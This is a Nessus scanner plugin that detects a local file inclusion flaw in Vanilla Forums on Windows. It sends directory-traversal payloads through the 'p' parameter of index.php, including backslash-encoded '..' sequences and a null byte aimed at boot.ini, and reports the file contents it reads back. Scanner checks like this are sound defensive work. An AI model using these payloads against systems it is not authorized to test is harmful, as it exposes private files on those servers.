#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(54614);
  script_version("$Revision: 1.8 $");
  script_cvs_date("$Date: 2015/09/24 23:21:22 $");

  script_bugtraq_id(47873);
  script_osvdb_id(72390);
  script_xref(name:"EDB-ID", value:"17295");

  script_name(english:"Vanilla Forum p Parameter Local File Inclusion");
  script_summary(english:"Tries to read a file");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server hosts a PHP script that's affected by a local
file inclusion vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The remote web server hosts Vanilla Forums, an open source forum
software written in PHP.

The installed version of Vanilla Forums uses a '/' character in the
'_AnalyzeRequest()' method in 'library/core/class.dispatcher.php' to
separate input passed via the 'p' parameter of the 'index.php' script
into a directory and controller name and then uses the former in a PHP
'require_once()' function call in the '_FetchController()' method in
the same class library.

When Vanilla is installed on a Windows host, an unauthenticated, remote
attacker can use '\' as an alternate directory separator in directory
traversal sequences in order control the directory as well as the
initial part of the file to be used in that 'require_once()' call.
This can allow the attacker to view arbitrary files or possibly to
execute arbitrary PHP code, subject to the privileges under which the
web server operates."
  );
  # http://www.autosectools.com/Advisory/Vanilla-Forum-2.0.17.9-Local-File-Inclusion-218
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?8606f33c");
  # http://packetstormsecurity.org/files/view/101448/VanillaForum2.0.17.9-lfi.txt
  script_set_attribute(
    attribute:"see_also",
    value:"http://www.nessus.org/u?93395673"
  );
  script_set_attribute(attribute:"solution", value:"Unknown at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"Vanilla Forums 2.0.17.9 LFI");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2011/05/14");
  script_set_attribute(attribute:"plugin_publication_date", value:"2011/05/23");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2011-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "os_fingerprint.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_keys("www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");


port = get_http_port(default:80, php:TRUE, embedded:FALSE);


os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >!< os) exit(0, "Only Vanilla installs on Windows are affected.");
}


files = make_list(
  '/boot.ini',
  'applications/dashboard/controllers/class.utilitycontroller.php'
);

file_pats = make_array();
file_pats['/boot.ini'] = "^ *\[boot loader\]";
file_pats['applications/dashboard/controllers/class.utilitycontroller.php'] = "Class 'DashboardController' not found";


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/vanilla", "/vanilla2", "/board", "/forums", "/forum", cgi_dirs()));
else dirs = make_list(cgi_dirs());

found_file = "";
content = "";
installs = 0;
vuln_urls = make_list();

foreach dir (dirs)
{
  # Loop through files to look for.
  foreach file (files)
  {
    # Once we find a file that works, stick with it for any subsequent tests.
    if (found_file && file != found_file) continue;

    if (file[0] == '/') exploit = mult_str(str:"..%5c", nb:12) + substr(file, 1) + '%00';
    else
    {
      exploit = file - 'controller.php';
      exploit = str_replace(find:"/", replace:"%5c", string:exploit);
      exploit = mult_str(str:"..%5c", nb:4) + exploit;
    }

    url = dir + '/index.php?' +
      'p=' + exploit;
    res = http_send_recv3(method:"GET", item:url, port:port, exit_on_fail:TRUE);

    # Determine if the software's actually installed to avoid "false positives".
    if (
      'Vanilla=deleted' >< res[1] ||
      'title>Vanilla' >< res[2] ||
      "Class 'DashboardController' not found" >< res[2]
    )
    {
      installs++;
    }
    # otherwise move on to next directory unless we're being paranoid.
    else if (report_paranoia < 2)
    {
      break;
    }

    # There's a problem if we see the expected contents.
    body = res[2];
    file_pat = file_pats[file];

    if (egrep(pattern:file_pat, string:body))
    {
      vuln_urls = make_list(vuln_urls, url);

      if (!contents && egrep(pattern:file_pat, string:body))
      {
        found_file = file;
        contents = body;
        if (file[0] == '/')
        {
          contents -= strstr(contents, "<?xml version=");
          contents = chomp(contents);
        }
      }
    }
  }
  if (contents && !thorough_tests) break;
}
if (!installs && report_paranoia < 2) exit(0, "The web server listening on port "+port+" does not appear to host Vanilla Forums.");
if (max_index(vuln_urls) == 0) exit(0, "No vulnerable installs of Vanilla Forums were found on the web server on port "+port+".");


# Report findings.
if (report_verbosity > 0)
{
  line_limit = 10;
  trailer = '';

  if (found_file[0] != '/')
  {
    header =
      'Nessus verified the issue by trying to include the application\'s own\n' +
      '\'' + found_file + '\'\n' +
      'script and verifying the output in the response stream using the\n' +
      'following URL';

    if (report_verbosity > 1)
    {
      trailer =
        'Here is its output (limited to ' + line_limit + ' lines) :\n' +
        '\n' +
        crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n' +
        contents + '\n' +
        crap(data:"-", length:30) + " snip " + crap(data:"-", length:30);
    }
  }
  else
  {
    if (os && "Windows" >< os) found_file = str_replace(find:'/', replace:'\\', string:found_file);

    header =
      'Nessus was able to exploit the issue to retrieve the contents of\n' +
      "'" + found_file + "' on the remote host using the following URL";

    if (report_verbosity > 1)
    {
      trailer =
        'Here are its contents (limited to ' + line_limit + ' lines) :\n' +
        '\n' +
        crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n' +
        beginning_of_response(resp:contents, max_lines:line_limit) +
        crap(data:"-", length:30) + " snip " + crap(data:"-", length:30);
    }
  }

  report = get_vuln_report(items:vuln_urls, port:port, header:header, trailer:trailer);
  security_warning(port:port, extra:report);
}
else security_warning(port);
